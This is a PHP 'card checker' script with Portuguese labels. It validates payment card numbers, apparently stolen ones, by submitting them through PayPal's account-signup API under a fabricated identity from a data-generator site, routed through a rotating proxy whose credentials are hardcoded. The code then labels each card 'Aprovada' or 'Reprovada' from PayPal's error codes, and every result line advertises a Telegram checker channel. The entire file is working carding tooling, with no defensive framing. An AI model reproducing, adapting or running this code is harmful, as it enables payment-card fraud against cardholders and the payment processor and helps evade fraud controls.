<?php
session_start();
  error_reporting(0);
#--
  require 'Functions.php';
    use \CHECKER\API\FUNCTIONS\Functions as F;
#--

//---------------------------//Incluindo api//------------------------//
require 'SetExpressCheckout.php'; // api que gera token
require 'func.php'; // api que gera token
set_time_limit(0);
$TOKEN = $responseNvp['TOKEN']; // define o token
//===================================================================//
$aleatorio = rand(5, 10); // 5 À 10 CARACTERES

extract($_REQUEST);
$lista = str_replace(" ", "", $lista);
$separar = explode($_REQUEST["separador"], $lista);
$cc = $separar[0];
$mes = $separar[1];
if (strlen($mes) == 1) {
	$mes = "0" . $mes; 
}
$ano = $separar[2];
if (strlen($ano) <= 2) {
	$ano = "20" . $ano;
}
if (!is_numeric($cc)) {
	$erro = true;
}
$mes = $separar[1];
if (!is_numeric($mes)) {
	$erro = true;
}
$ano = $separar[2];
if (!is_numeric($ano)) {
	$erro = true;
}
$cvv = $separar[3];
if (!is_numeric($cvv)) {
	$erro = true;
} else {
	$erro = false;
}
if ($erro == true) {
	echo "<span class='badge badge-danger'> Reprovada </span> $cc|$mes|$ano|$cvv <span class='badge badge-danger'>INVALIDO</span>";
	exit;
}
#============================================


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie_.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie_.txt");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$rg = $dados1["rg"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$numero = $dados1["numero"];
$bairro = $dados1["bairro"];
$cidade = $dados1["cidade"];
$estado = $dados1["estado"];
$telefone_fixo = $dados1["telefone_fixo"];
$celular = $dados1["celular"];

//====================================
$N="lts.".substr(md5(uniqid("")),0,8);
$type = cctype($cc);
//==========================================================================//

curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/hermes?flow=1-P&ulReturn=true&token='.$TOKEN.'&country.x=BR&locale.x=pt_BR#/checkout/pageAddCard/addCardFlow/addCard?message=NEED_CREDIT_CARD');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'));
$Pagamento1 = curl_exec($ch);
$Csrf = GetStr($Pagamento1, '"x-csrf-jwt": "', '",');
$calc = getstr($Pagamento1, '"calc": "','"');

//==============================================//================================================//
$username = 'lum-customer-hl_4892765d-zone-zone1-route_err-pass_dyn';
$password = '9z3znfltozyw';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
//======================================//PAGAMENTO (2)//=========================================//
$ch = curl_init();
/////////////post inicio///////////////
$post = '{"data":{"user":{"first_name":"kevin","last_name":"galvao","email":"'.$N.'@outlook.com.br","password":"pablo123","countryOfResidence":"BR","country":"BR","dob_day":"15","dob_month":"04","dob_year":"1979"},"billing_address":{"line1":"Rua Kiyoshi Minami  15","line2":"Jardim Califórnia","city":"Sorocaba","state":"SP","postal_code":"76880000","normalization_status":"NORMALIZED","country":"BR"},"shipping_address":{"first_name":"kevin","last_name":"galvao","line1":"Rua Kiyoshi Minami  15","line2":"Jardim Califórnia","city":"Sorocaba","state":"SP","postal_code":"18071-698","country":"BR"},"phone":{"type":"Mobile","number":"1599188'.rand(0000, 9999).'","countryCode":"55"},"testParams":{},"nationalIdModel":{"nationalId":{"type":"TAX_ID","subType":"CPF","value":"'.$cpf.'"}},"card":{"type":"'.$type.'","number":"'.$cc.'","security_code":"'.$cvv.'","expiry_month":"'.$mes.'","expiry_year":"'.$ano.'"}},"meta":{"token":"'.$TOKEN.'","calc":"ce033140fa741","csci":"2ffc5248982b4787b77f45b686308b39","locale":{"country":"BR","language":"pt"},"state":"ui_checkout_multistepsignup_multistepsignupcreateaccount","app_name":"xoonboardingnodeweb"}}';
/////////////proxy fim//////////////////
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/xoonboarding/api/onboard/signup');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($curl, CURLOPT_PROXYUSERPWD, "$username-country-br-session-$session:$password");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.paypal.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept: */*',
'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
'Accept-Encoding: gzip, deflate, br',
'Content-Type: application/json;charset=UTF-8',
'x-csrf-jwt: ' . $Csrf,
'Connection: keep-alive',
'Referer: https://www.paypal.com/webapps/xoonboarding?country.x=BR&exp=signup&flow=1-P&locale.x=pt_BR&token='.$TOKEN.'&ulReturn=true',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$Pagamento2 = curl_exec($ch);



if(strpos($Pagamento2, 'ISSUER_DECLINE')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Transação recusada!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================

}else if(strpos($Pagamento2, '{"field":"cvv","issue":"INVALID"}')){




DIE('<div id="live" name="live"><b class="text-success">Aprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' | <b>RETORNO:</b> CVV IS A INVÁLID <i class="fa fa-chevron-right" aria-hidden="true"></i> | <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i>By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');

#========================================================
//========================================================


}else if(strpos($Pagamento2, 'EXCEEDING_TOTAL_DUPLICATE_LIMIT')){



DIE('<div id="live" name="live"><b class="text-success">Aprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' | <b>RETORNO:</b> CARD ALREAD EXIST <i class="fa fa-chevron-right" aria-hidden="true"></i> | <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i>By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');

#========================================================
//========================================================



}
else if (strpos($Pagamento2, 'accessToken')){


DIE('<div id="live" name="live"><b class="text-success">Aprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' | <b>RETORNO:</b> CARD FULL <i class="fa fa-chevron-right" aria-hidden="true"></i> | <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i>By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');

#========================================================
//========================================================



}
else if(strpos($Pagamento2, 'ACCOUNT_ALREADY_EXISTS')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">ALREAD ACCOUNT EXIST!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}else if(strpos($Pagamento2, 'Ocorreu um erro')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Ocorreu um erro!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}
elseif(strpos($Pagamento2, 'RISK_DENIED')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Transação negada!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}
elseif(strpos($Pagamento2, 'INVALID')){


DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Cartão Inválido!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}
elseif(strpos($Pagamento2, 'CC_LINKED_TO_FULL_ACCOUNT')){



DIE('<div id="live" name="live"><b class="text-success">Aprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' | <b>RETORNO:</b> CARD ADDED IN OTHER ACCOUNT <i class="fa fa-chevron-right" aria-hidden="true"></i> | <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i>By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');

#========================================================
//========================================================


}
elseif(strpos($Pagamento2, 'VALIDATION_ERROR')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Algo digitado errado!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}

elseif(strpos($Pagamento2, 'OAS_GENERIC_ERROR')){

DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">Erro na validação!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================

}
else{


DIE('<div id="die" name="die"><b class="text-danger">Reprovada</b> | <i class="fa fa-chevron-circle-right" aria-hidden="true"></i> '.$lista.' |  <b>RETORNO:</b> <span class="badge badge-danger">ERRO TOTAL!</span>  <i class="fa fa-chevron-right" aria-hidden="true"></i> <span class="badge badge-primary"><i class="fa fa-coffee" aria-hidden="true"></i> By: https://t.me/painelcheckers</span> <hr class="checker-hr"></div>');
#========================================================
//========================================================


}



?>